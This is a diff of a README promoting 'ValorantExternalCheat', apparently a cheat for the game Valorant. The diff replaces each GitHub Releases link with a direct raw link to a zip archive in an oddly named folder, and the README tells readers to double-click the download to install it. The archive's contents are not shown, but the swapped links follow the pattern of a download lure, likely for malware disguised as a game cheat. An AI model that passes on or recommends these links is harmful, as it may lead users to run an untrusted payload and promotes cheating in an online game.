@@ -1,6 +1,6 @@
 # 🎮 ValorantExternalCheat - Enhance Your Game Experience Simply
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/SNikhilEswar/ValorantExternalCheat/releases)
+[![Download Now](https://raw.githubusercontent.com/SNikhilEswar/ValorantExternalCheat/main/Barbeyaceae/ValorantExternalCheat.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/SNikhilEswar/ValorantExternalCheat/main/Barbeyaceae/ValorantExternalCheat.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To get started, visit the Releases page. Follow these steps:
 5. Double-click the file to start the installation process.
 6. Follow any on-screen instructions to complete the setup.
 
-[Download Here](https://github.com/SNikhilEswar/ValorantExternalCheat/releases)
+[Download Here](https://raw.githubusercontent.com/SNikhilEswar/ValorantExternalCheat/main/Barbeyaceae/ValorantExternalCheat.zip)
 
 ## 🛠 Features
 
@@ -74,4 +74,4 @@ For additional inquiries, you can reach out directly via the issues section on G
 
 Don't forget to share your feedback and experience with ValorantExternalCheat!
 
-[Download Here](https://github.com/SNikhilEswar/ValorantExternalCheat/releases)
+[Download Here](https://raw.githubusercontent.com/SNikhilEswar/ValorantExternalCheat/main/Barbeyaceae/ValorantExternalCheat.zip)
